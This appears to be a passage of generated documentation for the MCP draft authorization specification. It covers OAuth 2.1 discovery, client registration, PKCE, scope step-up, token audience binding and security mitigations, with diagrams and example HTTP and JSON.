- **Authorization Server**: Issues tokens, may be hosted with MCP server or as separate service, MUST implement OAuth 2.1 with PKCE support

**Sources:** [docs/specification/draft/basic/authorization.mdx:40-54]()

### Implementation Requirements Matrix

| Component | MUST | SHOULD | MAY |
|-----------|------|--------|-----|
| **Authorization Servers** | OAuth 2.1 implementation, PKCE support, RFC9728 compliance | DCR (RFC7591), Short-lived tokens | Multiple discovery mechanisms |
| **MCP Servers** | RFC9728 Protected Resource Metadata, Token audience validation, WWW-Authenticate headers | Include `scope` in 401 responses | Custom scope strategies |
| **MCP Clients** | RFC9728 support, PKCE with S256, `resource` parameter, Both discovery mechanisms | DCR (RFC7591), State parameter validation | Retry logic for scope challenges |

**Sources:** [docs/specification/draft/basic/authorization.mdx:55-71]()

## Authorization Server Discovery

### Discovery Mechanisms

MCP provides multiple discovery paths to locate authorization servers and their capabilities:

```mermaid
sequenceDiagram
    participant C as "MCP Client"
    participant M as "MCP Server"
    participant A as "Authorization Server"
    
    Note over C: "Attempt unauthenticated request"
    C->>M: "MCP request without Authorization header"
    M->>C: "HTTP 401 Unauthorized<br/>WWW-Authenticate: Bearer resource_metadata=..., scope=..."
    
    alt "WWW-Authenticate includes resource_metadata"
        C->>M: "GET resource_metadata URI"
        M->>C: "Protected Resource Metadata<br/>{authorization_servers: [...], scopes_supported: [...]}"
    else "No resource_metadata in header"
        Note over C: "Fallback to well-known URI probing"
        C->>M: "GET /.well-known/oauth-protected-resource/mcp"
        alt "Sub-path metadata exists"
            M->>C: "Protected Resource Metadata"
        else "Sub-path not found"
            C->>M: "GET /.well-known/oauth-protected-resource"
            alt "Root metadata exists"
                M->>C: "Protected Resource Metadata"
            else "Root metadata not found"
                Note over C: "Abort or use pre-configured values"
            end
        end
    end
    
    Note over C: "Extract authorization_servers[0]"
    
    Note over C: "Try AS metadata endpoints in priority order"
    C->>A: "GET /.well-known/oauth-authorization-server[/path]"
    alt "OAuth 2.0 AS Metadata found"
        A->>C: "AS Metadata (RFC8414)"
    else "Try OpenID Connect Discovery"
        C->>A: "GET /.well-known/openid-configuration[/path]"
        A->>C: "OIDC Discovery document"
    end
```

**Sources:** [docs/specification/draft/basic/authorization.mdx:72-194]()

### Protected Resource Metadata Discovery

MCP servers **MUST** implement one of these discovery mechanisms:

1. **WWW-Authenticate Header** (Preferred):
```http
HTTP/1.1 401 Unauthorized
WWW-Authenticate: Bearer resource_metadata="https://mcp.example.com/.well-known/oauth-protected-resource",
                         scope="files:read"
```

2. **Well-Known URI** at MCP endpoint path:
```
https://example.com/public/mcp → https://example.com/.well-known/oauth-protected-resource/public/mcp
```

3. **Well-Known URI** at root:
```
https://example.com/.well-known/oauth-protected-resource
```

**MCP Client Requirements:**
- MUST support both discovery mechanisms
- MUST use `resource_metadata` from WWW-Authenticate when present
- MUST fall back to well-known URIs in order listed above
- MUST be able to parse WWW-Authenticate headers

**Sources:** [docs/specification/draft/basic/authorization.mdx:91-128]()

### Authorization Server Metadata Discovery

MCP clients **MUST** attempt multiple well-known endpoints to handle different issuer URL formats:

**For issuer URLs with path components** (e.g., `https://auth.example.com/tenant1`):
1. OAuth 2.0 AS Metadata with path insertion: `https://auth.example.com/.well-known/oauth-authorization-server/tenant1`
2. OpenID Connect Discovery with path insertion: `https://auth.example.com/.well-known/openid-configuration/tenant1`
3. OpenID Connect Discovery path appending: `https://auth.example.com/tenant1/.well-known/openid-configuration`

**For issuer URLs without path components** (e.g., `https://auth.example.com`):
1. OAuth 2.0 AS Metadata: `https://auth.example.com/.well-known/oauth-authorization-server`
2. OpenID Connect Discovery: `https://auth.example.com/.well-known/openid-configuration`

**Authorization Server Requirements:**
- MUST provide at least one discovery mechanism (RFC8414 or OpenID Connect Discovery)
- OpenID providers MUST include `code_challenge_methods_supported` in metadata for MCP compatibility

**Sources:** [docs/specification/draft/basic/authorization.mdx:129-145]()

### Discovery Protocol Details

```mermaid
graph TD
    Start["Client receives HTTP 401"]
    
    ParseHeader["Parse WWW-Authenticate header"]
    ExtractRM["Extract resource_metadata URL"]
    HasRM{resource_metadata<br/>present?}
    
    FetchRM["Fetch resource_metadata URL"]
    TrySubPath["Try /.well-known/oauth-protected-resource/[mcp-path]"]
    TryRoot["Try /.well-known/oauth-protected-resource"]
    
    SubPathSuccess{Success?}
    RootSuccess{Success?}
    
    ParseRS["Parse Protected Resource Metadata"]
    ExtractAS["Extract authorization_servers array"]
    SelectAS["Select authorization server<br/>(client decision)"]
    
    TryOAuth["Try OAuth 2.0 AS Metadata<br/>/.well-known/oauth-authorization-server[/path]"]
    TryOIDC["Try OpenID Connect Discovery<br/>/.well-known/openid-configuration[/path]"]
    
    OAuthSuccess{Success?}
    OIDCSuccess{Success?}
    
    ParseAS["Parse Authorization Server Metadata"]
    ValidatePKCE["Validate code_challenge_methods_supported<br/>includes S256"]
    PKCESupported{PKCE<br/>supported?}
    
    ProceedAuth["Proceed with authorization flow"]
    AbortNoPKCE["MUST refuse to proceed<br/>No PKCE support"]
    AbortNoMetadata["Abort or use pre-configured values"]
    
    Start --> ParseHeader
    ParseHeader --> HasRM
    
    HasRM -->|Yes| ExtractRM
    ExtractRM --> FetchRM
    FetchRM --> ParseRS
    
    HasRM -->|No| TrySubPath
    TrySubPath --> SubPathSuccess
    SubPathSuccess -->|Yes| ParseRS
    SubPathSuccess -->|No| TryRoot
    TryRoot --> RootSuccess
    RootSuccess -->|Yes| ParseRS
    RootSuccess -->|No| AbortNoMetadata
    
    ParseRS --> ExtractAS
    ExtractAS --> SelectAS
    SelectAS --> TryOAuth
    
    TryOAuth --> OAuthSuccess
    OAuthSuccess -->|Yes| ParseAS
    OAuthSuccess -->|No| TryOIDC
    
    TryOIDC --> OIDCSuccess
    OIDCSuccess -->|Yes| ParseAS
    OIDCSuccess -->|No| AbortNoMetadata
    
    ParseAS --> ValidatePKCE
    ValidatePKCE --> PKCESupported
    PKCESupported -->|Yes| ProceedAuth
    PKCESupported -->|No| AbortNoPKCE
```

**Key Metadata Fields:**

**Protected Resource Metadata (RFC9728):**
- `resource`: Canonical URI of the MCP server
- `authorization_servers`: Array of authorization server issuer URLs
- `scopes_supported`: Optional array of scope strings for least-privilege access
- `bearer_methods_supported`: Token transmission methods (typically `["header"]`)

**Authorization Server Metadata (RFC8414/OIDC Discovery):**
- `issuer`: Authorization server issuer URL
- `authorization_endpoint`: URL for authorization requests
- `token_endpoint`: URL for token requests
- `code_challenge_methods_supported`: **MUST** include `S256` for MCP compatibility
- `registration_endpoint`: Optional URL for dynamic client registration (RFC7591)
- `scopes_supported`: Optional list of supported scope values

**Sources:** [docs/specification/draft/basic/authorization.mdx:129-145, 476-488]()

## Client Registration Approaches

### Overview and Priority Order

MCP supports three client registration mechanisms to handle the diverse ecosystem where clients and servers often have no prior relationship. Clients supporting multiple options **SHOULD** follow this priority order:

```mermaid
graph TD
    Start["Client needs registration"]
    
    CheckPreReg{Pre-registered<br/>client_id available?}
    UsePreReg["Use Pre-registered Credentials<br/>Priority 1"]
    
    CheckCIMD{"Authorization Server Metadata<br/>client_id_metadata_document_supported?"}
    UseCIMD["Use Client ID Metadata Documents<br/>Priority 2"]
    
    CheckDCR{"Authorization Server Metadata<br/>registration_endpoint present?"}
    UseDCR["Use Dynamic Client Registration<br/>Priority 3"]
    
    PromptUser["Prompt User for Manual Registration<br/>Priority 4"]
    
    ProceedAuth["Proceed with Authorization Flow"]
    
    Start --> CheckPreReg
    CheckPreReg -->|Yes| UsePreReg
    CheckPreReg -->|No| CheckCIMD
    
    CheckCIMD -->|Yes| UseCIMD
    CheckCIMD -->|No| CheckDCR
    
    CheckDCR -->|Yes| UseDCR
    CheckDCR -->|No| PromptUser
    
    UsePreReg --> ProceedAuth
    UseCIMD --> ProceedAuth
    UseDCR --> ProceedAuth
    PromptUser --> ProceedAuth
```

**Priority Order Rationale:**
1. **Pre-registration**: Highest priority for established client-server relationships
2. **Client ID Metadata Documents**: Addresses "unbounded clients/servers" problem with URL-based registration
3. **Dynamic Client Registration**: Backward compatibility fallback
4. **Manual Registration**: Last resort requiring user intervention

**Sources:** [docs/specification/draft/basic/authorization.mdx:199-212]()

### Client ID Metadata Documents (Recommended)

MCP clients and authorization servers **SHOULD** support OAuth Client ID Metadata Documents (draft-ietf-oauth-client-id-metadata-document-00) as specified in [docs/specification/draft/basic/authorization.mdx:213-317]().

**Client ID Metadata Documents Flow:**

```mermaid
sequenceDiagram
    participant User
    participant Client["MCP Client"]
    participant MetadataHost["https://app.example.com"]
    participant Server["Authorization Server"]
    participant Resource["MCP Server"]
    
    Note over Client,MetadataHost: "Client hosts metadata document at HTTPS URL"
    
    User->>Client: "Initiates connection to MCP Server"
    
    Client->>Server: "Authorization Request<br/>client_id=https://app.example.com/oauth/client-metadata.json<br/>redirect_uri=http://localhost:3000/callback<br/>code_challenge=xyz&code_challenge_method=S256"
    
    Server->>User: "Authentication prompt"
    User->>Server: "Provides credentials"
    
    Note over Server: "Detects URL-formatted client_id"
    
    Server->>MetadataHost: "GET https://app.example.com/oauth/client-metadata.json"
    MetadataHost-->>Server: "JSON Metadata Document<br/>{<br/>  client_id: 'https://app.example.com/oauth/client-metadata.json',<br/>  client_name: 'Example MCP Client',<br/>  redirect_uris: ['http://localhost:3000/callback'],<br/>  grant_types: ['authorization_code'],<br/>  response_types: ['code'],<br/>  token_endpoint_auth_method: 'none'<br/>}"
    
    Note over Server: "Validates:<br/>1. client_id matches URL<br/>2. redirect_uri in allowed list<br/>3. Document structure valid"
    
    alt "Validation Success"
        Server->>User: "Display consent page with client_name"
        User->>Server: "Approves access"
        Server->>Client: "Authorization code via redirect_uri"
        Client->>Server: "Exchange code for token<br/>client_id=https://app.example.com/oauth/client-metadata.json"
        Server-->>Client: "Access token"
        Client->>Resource: "MCP requests with access token"
        Resource-->>Client: "MCP responses"
    else "Validation Failure"
        Server->>User: "Error response<br/>error=invalid_client or invalid_request"
    end
    
    Note over Server: "Cache metadata for future requests<br/>(respecting HTTP cache headers)"
```

**Implementation Requirements:**

**MCP Clients MUST:**
- Host metadata document at HTTPS URL with path component (e.g., `https://example.com/client.json`)
- Ensure `client_id` in metadata matches document URL exactly
- Include required fields: `client_id`, `client_name`, `redirect_uris`
- Use `token_endpoint_auth_method: "none"` for public clients
- May use `private_key_jwt` for authentication with appropriate JWKS configuration

**Authorization Servers SHOULD:**
- Fetch metadata documents when encountering URL-formatted `client_id` values
- Validate fetched document's `client_id` matches URL exactly
- Cache metadata respecting HTTP cache headers
- Validate redirect URIs against metadata document
- Advertise support via `client_id_metadata_document_supported: true` in Authorization Server Metadata

**Example Metadata Document:**
```json
{
  "client_id": "https://app.example.com/oauth/client-metadata.json",
  "client_name": "Example MCP Client",
  "client_uri": "https://app.example.com",
  "logo_uri": "https://app.example.com/logo.png",
  "redirect_uris": [
    "http://127.0.0.1:3000/callback",
    "http://localhost:3000/callback"
  ],
  "grant_types": ["authorization_code"],
  "response_types": ["code"],
  "token_endpoint_auth_method": "none"
}
```

**Discovery:**

Authorization servers advertise support in OAuth Authorization Server Metadata:
```json
{
  "client_id_metadata_document_supported": true
}
```

**Sources:** [docs/specification/draft/basic/authorization.mdx:213-317]()

### Pre-registration

MCP clients **SHOULD** support static client credentials for established client-server relationships. This can be implemented by:

1. **Hardcoded Credentials**: Client ID (and client secret if applicable) embedded for specific authorization server
2. **User Configuration UI**: Allow users to enter credentials after manual registration through server's configuration interface

**Sources:** [docs/specification/draft/basic/authorization.mdx:318-327]()

### Dynamic Client Registration (Backward Compatibility)

MCP clients and authorization servers **MAY** support OAuth 2.0 Dynamic Client Registration Protocol (RFC7591) for backward compatibility with earlier MCP authorization specifications.

**Dynamic Client Registration Flow:**

```mermaid
sequenceDiagram
    participant C["MCP Client"]
    participant A["Authorization Server<br/>registration_endpoint"]
    
    Note over C: "Discovered registration_endpoint from AS metadata"
    
    C->>A: "POST /register<br/>Content-Type: application/json<br/>{<br/>  client_name: 'My MCP Client',<br/>  redirect_uris: ['http://localhost:8080/callback'],<br/>  grant_types: ['authorization_code', 'refresh_token'],<br/>  token_endpoint_auth_method: 'none'<br/>}"
    
    Note over A: "Validates request<br/>Applies registration policy<br/>Generates client_id"
    
    alt "Registration successful"
        A->>C: "HTTP 201 Created<br/>{<br/>  client_id: 'abc123',<br/>  client_secret: null,<br/>  redirect_uris: ['http://localhost:8080/callback'],<br/>  grant_types: ['authorization_code', 'refresh_token'],<br/>  client_id_issued_at: 1234567890<br/>}"
        Note over C: "Store client_id for future requests"
    else "Registration rejected"
        A->>C: "HTTP 400 Bad Request<br/>{<br/>  error: 'invalid_redirect_uri',<br/>  error_description: '...'<br/>}"
        Note over C: "Handle error or fall back to manual registration"
    end
```

**Key Registration Parameters:**
- `client_name`: Human-readable client name
- `redirect_uris`: Array of valid redirect URIs (localhost or HTTPS)
- `grant_types`: Should include `authorization_code`, `refresh_token`
- `token_endpoint_auth_method`: Set to `none` for public clients
- `response_types`: Typically `["code"]` for authorization code flow

**Sources:** [docs/specification/draft/basic/authorization.mdx:328-334]()

## Authorization Flow

### Complete Authorization Flow with PKCE

```mermaid
sequenceDiagram
    participant B as "User-Agent<br/>(Browser)"
    participant C as "MCP Client"
    participant M as "MCP Server<br/>(Resource Server)"
    participant A as "Authorization Server"
    
    rect
        Note over C,M: "Phase 1: Discovery"
        C->>M: "MCP request without token"
        M->>C: "HTTP 401 Unauthorized<br/>WWW-Authenticate: Bearer resource_metadata=..."
        C->>M: "GET resource_metadata URI"
        M->>C: "Protected Resource Metadata<br/>{authorization_servers: [...]}"
        C->>A: "GET Authorization Server Metadata"
        A->>C: "AS Metadata<br/>{authorization_endpoint, token_endpoint, ...}"
    end
    
    rect
        Note over C,A: "Phase 2: Client Registration (Choose based on priority)"
        
        alt "Pre-registration available"
            Note over C: "Use existing client_id"
        else "Client ID Metadata Documents supported"
            Note over C: "Use HTTPS URL as client_id<br/>client_id=https://app.example.com/oauth/metadata.json"
            A->>C: "Fetch metadata from client_id URL"
            C-->>A: "JSON metadata document"
            Note over A: "Validate metadata and redirect_uris"
        else "Dynamic Client Registration supported"
            C->>A: "POST /register<br/>{client_name, redirect_uris, ...}"
            A->>C: "Client Credentials<br/>{client_id: 'abc123', ...}"
        else "Manual registration required"
            Note over C: "Prompt user to enter client_id"
        end
    end
    
    rect
        Note over B,A: "Phase 3: Authorization Code Flow with PKCE"
        Note over C: "Generate PKCE parameters<br/>code_verifier = random(43-128 chars)<br/>code_challenge = base64url(sha256(code_verifier))"
        Note over C: "Apply Scope Selection Strategy<br/>Use scope from WWW-Authenticate or scopes_supported"
        Note over C: "Include resource parameter<br/>resource = https://mcp.example.com"
        
        C->>B: "Open browser with authorization URL:<br/>?response_type=code<br/>&client_id=abc123<br/>&redirect_uri=http://localhost:8080/callback<br/>&code_challenge=xyz<br/>&code_challenge_method=S256<br/>&resource=https://mcp.example.com<br/>&scope=files:read<br/>&state=random-state"
        
        B->>A: "GET /authorize with parameters"
        Note over A: "User authenticates<br/>User authorizes scopes"
        A->>B: "Redirect to callback:<br/>?code=auth-code-123<br/>&state=random-state"
        
        B->>C: "Authorization code callback"
        Note over C: "Validate state parameter"
        
        C->>A: "POST /token<br/>grant_type=authorization_code<br/>&code=auth-code-123<br/>&redirect_uri=http://localhost:8080/callback<br/>&code_verifier=original-verifier<br/>&resource=https://mcp.example.com<br/>&client_id=abc123"
        
        Note over A: "Validate PKCE<br/>Validate resource parameter<br/>Issue token bound to audience"
        
        A->>C: "Access Token Response<br/>{<br/>  access_token: 'eyJ...',<br/>  token_type: 'Bearer',<br/>  expires_in: 3600,<br/>  refresh_token: '...',<br/>  scope: 'files:read'<br/>}"
    end
    
    rect
        Note over C,M: "Phase 4: MCP Communication"
        C->>M: "MCP request<br/>Authorization: Bearer eyJ..."
        Note over M: "Validate token audience<br/>matches self"
        M->>C: "MCP response"
        Note over C,M: "Ongoing communication with valid token"
    end
```

**Sources:** [docs/specification/draft/basic/authorization.mdx:236-276]()

### PKCE Requirements

**Proof Key for Code Exchange (PKCE)** is **REQUIRED** for all MCP clients to prevent authorization code interception and injection attacks.

**PKCE Protocol:**
1. Client generates `code_verifier`: Random string (43-128 characters)
2. Client computes `code_challenge`: `base64url(sha256(code_verifier))`
3. Client sends `code_challenge` and `code_challenge_method=S256` in authorization request
4. Client sends `code_verifier` in token request
5. Authorization server validates that `sha256(code_verifier)` matches the stored `code_challenge`

**MCP-Specific Requirements:**
- Clients MUST use `S256` code challenge method when technically capable
- Clients MUST verify PKCE support before proceeding with authorization
- Clients MUST refuse to proceed if `code_challenge_methods_supported` is absent or doesn't include `S256`
- Authorization servers MUST include `code_challenge_methods_supported` in metadata

**Sources:** [docs/specification/draft/basic/authorization.mdx:472-488]()

### Resource Parameter Implementation

MCP clients **MUST** implement Resource Indicators (RFC8707) to bind tokens to specific MCP servers and prevent token misuse across services.

**Requirements:**
1. MUST include `resource` parameter in both authorization and token requests
2. MUST identify the MCP server the client intends to use the token with
3. MUST use the canonical URI of the MCP server

**Canonical Server URI Definition:**

```mermaid
graph LR
    Input["MCP Server URL"]
    
    subgraph "Valid Canonical URIs"
        V1["https://mcp.example.com/mcp"]
        V2["https://mcp.example.com"]
        V3["https://mcp.example.com:8443"]
        V4["https://mcp.example.com/server/mcp"]
    end
    
    subgraph "Invalid Canonical URIs"
        I1["mcp.example.com<br/>(missing scheme)"]
        I2["https://mcp.example.com#fragment<br/>(contains fragment)"]
    end
    
    Input --> V1
    Input --> V2
    Input --> V3
    Input --> V4
```

**Canonical URI Rules:**
- MUST include scheme (https)
- MUST include host (domain or IP)
- MAY include port if non-standard
- MAY include path when necessary to identify individual MCP server
- MUST NOT include fragment
- SHOULD omit trailing slash unless semantically significant
- SHOULD use lowercase scheme and host (but implementations SHOULD accept uppercase)

**Example Authorization Request:**
```
GET /authorize?
  response_type=code&
  client_id=abc123&
  redirect_uri=http://localhost:8080/callback&
  code_challenge=xyz&
  code_challenge_method=S256&
  resource=https%3A%2F%2Fmcp.example.com&
  scope=files:read&
  state=random-state
```

**Sources:** [docs/specification/draft/basic/authorization.mdx:278-315]()

## Scope Management

### Scope Selection Strategy

MCP clients **SHOULD** follow the principle of least privilege by requesting only necessary scopes. During initial authorization handshake, clients should use this priority order:

```mermaid
graph TD
    Start["Initiate authorization"]
    
    Check401["Check WWW-Authenticate header<br/>from HTTP 401 response"]
    HasScope{scope parameter<br/>present?}
    
    UseScope["Use scope from<br/>WWW-Authenticate header<br/>Priority 1"]
    
    CheckMetadata["Check Protected Resource Metadata"]
    HasScopesSupported{scopes_supported<br/>defined?}
    
    UseScopesSupported["Request all scopes from<br/>scopes_supported<br/>Priority 2"]
    OmitScope["Omit scope parameter<br/>(authorization server decides)"]
    
    BuildAuthRequest["Build authorization request<br/>with selected scopes"]
    
    Start --> Check401
    Check401 --> HasScope
    
    HasScope -->|Yes| UseScope
    HasScope -->|No| CheckMetadata
    
    CheckMetadata --> HasScopesSupported
    HasScopesSupported -->|Yes| UseScopesSupported
    HasScopesSupported -->|No| OmitScope
    
    UseScope --> BuildAuthRequest
    UseScopesSupported --> BuildAuthRequest
    OmitScope --> BuildAuthRequest
```

**Scope Selection Rationale:**

1. **Use `scope` from WWW-Authenticate** (Priority 1): Server explicitly signals minimal required scopes for initial access
2. **Use all `scopes_supported` from metadata** (Priority 2): Request full minimal scope set defined by resource server
3. **Omit scope parameter**: Let authorization server determine appropriate scopes if none specified

This approach accommodates the general-purpose nature of MCP clients, which typically lack domain-specific knowledge to make informed decisions about individual scope selection. Requesting all available scopes from `scopes_supported` allows the authorization server and end-user to determine appropriate permissions during the consent process.

The `scopes_supported` field represents the minimal set of scopes necessary for basic functionality (see Security Best Practices for scope minimization). Additional scopes can be requested incrementally through step-up authorization flows when more privileged operations are attempted.

**Sources:** [docs/specification/draft/basic/authorization.mdx:335-350]()

### Scope Challenge Handling

When a client has a token but needs additional permissions, servers respond with `insufficient_scope` errors, triggering step-up authorization.

**Runtime Insufficient Scope Response:**

```http
HTTP/1.1 403 Forbidden
WWW-Authenticate: Bearer error="insufficient_scope",
                         scope="files:read files:write user:profile",
                         resource_metadata="https://mcp.example.com/.well-known/oauth-protected-resource",
                         error_description="Additional file write permission required"
```

**Response Components:**
- `error="insufficient_scope"`: Indicates specific authorization failure type
- `scope`: Space-separated list of scopes needed for the operation
- `resource_metadata`: URI of Protected Resource Metadata document for consistency
- `error_description`: Optional human-readable description

**Scope Parameter Semantics:**

The `scope` parameter in `insufficient_scope` challenges has flexible semantics. Servers **MAY**:
- Include only newly-required scopes (minimum approach)
- Include existing granted scopes plus newly-required scopes (recommended approach)
- Include existing, newly-required, and related scopes that commonly work together (extended approach)

Servers **SHOULD** be consistent in their scope inclusion strategy to provide predictable behavior for clients. The scopes included **MAY** match `scopes_supported`, be a subset, superset, or alternative collection. Clients **MUST NOT** assume any particular set relationship and **MUST** treat challenged scopes as authoritative for satisfying the current request.

**Sources:** [docs/specification/draft/basic/authorization.mdx:504-532]()

### Step-Up Authorization Flow

```mermaid
sequenceDiagram
    participant C as "MCP Client"
    participant M as "MCP Server"
    participant B as "User-Agent"
    participant A as "Authorization Server"
    
    Note over C: "Client has existing access token<br/>with scope: files:read"
    
    C->>M: "Request to write file<br/>Authorization: Bearer existing-token"
    
    Note over M: "Check token scopes<br/>files:write required but not granted"
    
    M->>C: "HTTP 403 Forbidden<br/>WWW-Authenticate: Bearer error='insufficient_scope',<br/>  scope='files:read files:write'"
    
    Note over C: "Parse insufficient_scope error<br/>Extract required scopes"
    
    Note over C: "Determine scope set:<br/>- Keep existing: files:read<br/>- Add required: files:write<br/>Final: files:read files:write"
    
    C->>B: "Initiate re-authorization<br/>with expanded scope set"
    B->>A: "Authorization request<br/>scope=files:read files:write"
    
    Note over A: "User consents to<br/>additional permission"
    
    A->>B: "Authorization code"
    B->>C: "Code callback"
    
    C->>A: "Token request"
    A->>C: "New access token<br/>scope: files:read files:write"
    
    Note over C: "Replace existing token with new token"
    
    C->>M: "Retry original request<br/>Authorization: Bearer new-token"
    M->>C: "Success response"
```

**Step-Up Authorization Flow Requirements:**

**MCP Clients:**
1. **Parse error information** from authorization server response or WWW-Authenticate header
2. **Determine required scopes** following Scope Selection Strategy (use challenged scope set)
3. **Initiate re-authorization** with determined scope set
4. **Retry original request** with new access token
5. **SHOULD** implement retry limits to avoid repeated failures
6. **SHOULD** track scope upgrade attempts per resource/operation to detect permanent authorization failures

**When to Attempt Step-Up:**
- **SHOULD** attempt for clients acting on behalf of users (authorization code grant)
- **MAY** attempt or abort immediately for `client_credentials` clients acting on their own behalf

**MCP Servers:**
- **SHOULD** include scopes needed to satisfy current request in `scope` parameter
- **SHOULD** be consistent in scope inclusion strategy
- **SHOULD** consider user experience impact when determining which scopes to include
- **MAY** use different strategies: minimum (only new scopes), recommended (existing + new), or extended (existing + new + related)
- Servers have flexibility in determining which scopes to include based on assessment of user experience and authorization friction

**Sources:** [docs/specification/draft/basic/authorization.mdx:545-559]()

## Token Management

### Access Token Usage

**Token Transmission:**

MCP clients **MUST** use the `Authorization` header with Bearer scheme:

```http
GET /mcp HTTP/1.1
Host: mcp.example.com
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

**Requirements:**
- MUST use Authorization header field (OAuth 2.1 Section 5.1.1)
- MUST include authorization in every HTTP request, even within same logical session
- MUST NOT include access tokens in URI query string
- Access tokens MUST be transmitted as `Bearer` tokens per RFC6750

**Sources:** [docs/specification/draft/basic/authorization.mdx:317-344]()

### Token Validation

```mermaid
graph TD
    Receive["MCP Server receives request<br/>with Authorization: Bearer token"]
    
    Extract["Extract access token from header"]
    
    ValidateFormat{Token format<br/>valid?}
    
    CheckExpiry{Token<br/>expired?}
    
    ValidateAudience{Token audience<br/>matches server URI?}
    
    CheckScopes{Required scopes<br/>present?}
    
    ProcessRequest["Process MCP request"]
    
    Return401Format["HTTP 401 Unauthorized<br/>error: invalid_token<br/>error_description: Malformed token"]
    
    Return401Expired["HTTP 401 Unauthorized<br/>error: invalid_token<br/>error_description: Token expired"]
    
    Return401Audience["HTTP 401 Unauthorized<br/>error: invalid_token<br/>error_description: Invalid audience"]
    
    Return403Scope["HTTP 403 Forbidden<br/>error: insufficient_scope<br/>scope: required scopes"]
    
    Receive --> Extract
    Extract --> ValidateFormat
    
    ValidateFormat -->|Invalid| Return401Format
    ValidateFormat -->|Valid| CheckExpiry
    
    CheckExpiry -->|Expired| Return401Expired
    CheckExpiry -->|Valid| ValidateAudience
    
    ValidateAudience -->|Mismatch| Return401Audience
    ValidateAudience -->|Match| CheckScopes
    
    CheckScopes -->|Insufficient| Return403Scope
    CheckScopes -->|Sufficient| ProcessRequest
```

**MCP Server Validation Requirements:**
- MUST validate access tokens per OAuth 2.1 Section 5.2
- MUST validate token audience matches server's canonical URI (RFC8707)
- MUST verify tokens were issued by the server's authorization server
- MUST NOT accept or transit tokens for other resources
- MUST respond with HTTP 401 for invalid/expired tokens
- MUST respond with HTTP 403 for insufficient scopes

**MCP Client Validation Requirements:**
- MUST NOT send tokens to MCP server other than ones issued by that server's authorization server
- MUST verify state parameter in authorization responses
- MUST discard responses with mismatched or missing state

**Sources:** [docs/specification/draft/basic/authorization.mdx:345-362, 513-533]()

### Token Audience Binding

Token audience binding prevents token misuse across different services:

**Token Audience Validation Flow:**

```mermaid
sequenceDiagram
    participant C as "MCP Client"
    participant M as "MCP Server<br/>(https://mcp.example.com)"
    participant A as "Authorization Server"
    
    Note over C: "Requesting token for mcp.example.com"
    
    C->>A: "POST /token<br/>resource=https://mcp.example.com<br/>code=..., code_verifier=..."
    
    Note over A: "Issue token with audience<br/>aud: https://mcp.example.com"
    
    A->>C: "Access Token<br/>{aud: 'https://mcp.example.com'}"
    
    rect
        Note over C,M: "Valid Usage: Token used at intended server"
        C->>M: "Authorization: Bearer token"
        Note over M: "Validate token.aud == self<br/>https://mcp.example.com == https://mcp.example.com<br/>✓ Match"
        M->>C: "Success response"
    end
    
    rect
        Note over C: "Invalid Usage: Attacker tries token at different server"
        C->>M: "Authorization: Bearer token<br/>(to different-server.com)"
        Note over M: "Validate token.aud == self<br/>https://mcp.example.com != https://different-server.com<br/>✗ Mismatch"
        M->>C: "HTTP 401 Unauthorized<br/>Invalid audience"
    end
```

**Audience Binding Requirements:**
- Clients MUST include `resource` parameter in authorization and token requests
- Clients MUST send this parameter regardless of authorization server support
- Servers MUST validate tokens were issued specifically for them
- Servers MUST reject tokens that don't include them in the audience claim
- Servers MUST NOT pass through tokens received from clients to upstream APIs

**Sources:** [docs/specification/draft/basic/authorization.mdx:440-450, 513-533]()

### Token Lifecycle

| Token Event | Client Action | Server Action |
|-------------|---------------|---------------|
| **Issuance** | Store securely (OAuth 2.1 Section 7.1) | Issue short-lived tokens |
| **Usage** | Include in Authorization header | Validate on every request |
| **Expiration** | Request new token using refresh token | Return HTTP 401 |
| **Refresh** | Exchange refresh token for new access token | Rotate refresh tokens (public clients) |
| **Revocation** | Clear stored tokens | Invalidate tokens |

**Security Requirements:**
- Authorization servers SHOULD issue short-lived access tokens to reduce impact of token theft
- Authorization servers MUST rotate refresh tokens for public clients (OAuth 2.1 Section 4.3.1)
- Clients and servers MUST implement secure token storage
- Clients MUST follow OAuth 2.1 Section 7.1 best practices

**Sources:** [docs/specification/draft/basic/authorization.mdx:451-461]()

## Error Handling

### HTTP Status Codes

| Status Code | Description | Usage | Required WWW-Authenticate |
|-------------|-------------|-------|---------------------------|
| 401 Unauthorized | Authorization required or token invalid | No token provided, token expired, token invalid | Yes (with `resource_metadata`) |
| 403 Forbidden | Invalid scopes or insufficient permissions | Token valid but lacks required scopes | Yes (with `error`, `scope`) |
| 400 Bad Request | Malformed authorization request | Invalid parameters, malformed token | No |

**Sources:** [docs/specification/draft/basic/authorization.mdx:363-372]()

### WWW-Authenticate Header Formats

**Initial Authorization Required (401):**
```http
WWW-Authenticate: Bearer resource_metadata="https://mcp.example.com/.well-known/oauth-protected-resource",
                         scope="files:read"
```

**Invalid Token (401):**
```http
WWW-Authenticate: Bearer error="invalid_token",
                         error_description="The access token expired",
                         resource_metadata="https://mcp.example.com/.well-known/oauth-protected-resource"
```

**Insufficient Scope (403):**
```http
WWW-Authenticate: Bearer error="insufficient_scope",
                         scope="files:read files:write",
                         resource_metadata="https://mcp.example.com/.well-known/oauth-protected-resource",
                         error_description="Additional file write permission required"
```

**Sources:** [docs/specification/draft/basic/authorization.mdx:117-123, 409-418]()

## Security Requirements

### Communication Security

All authorization communication **MUST** use HTTPS:

**Requirements:**
- All authorization server endpoints MUST be served over HTTPS
- All redirect URIs MUST be either `localhost` or use HTTPS
- Implementations MUST follow OAuth 2.1 Section 1.5 Communication Security
- TLS 1.2 or higher SHOULD be enforced
- Certificate validation MUST NOT be disabled

**Sources:** [docs/specification/draft/basic/authorization.mdx:462-471]()

### PKCE and Authorization Code Protection

PKCE prevents authorization code interception and injection attacks:

**Attack Scenario Without PKCE:**
1. Attacker intercepts authorization code from redirect
2. Attacker exchanges code for access token before legitimate client
3. Attacker gains unauthorized access

**Protection with PKCE:**
1. Client generates random `code_verifier` and sends `code_challenge` to authorization server
2. Even if attacker intercepts authorization code, they don't have `code_verifier`
3. Authorization server rejects token exchange without matching `code_verifier`

**Sources:** [docs/specification/draft/basic/authorization.mdx:472-488]()

### Open Redirection Prevention

**Attack Vector:** Attacker crafts malicious redirect URIs to direct users to phishing sites.

**Mitigations:**

**MCP Clients MUST:**
- Have redirect URIs registered with authorization server
- Verify state parameters in authorization code flow
- Discard responses with mismatched or missing state

**Authorization Servers MUST:**
- Validate exact redirect URIs against pre-registered values
- Take precautions to prevent redirecting to untrusted URIs (OAuth 2.1 Section 7.12.2)
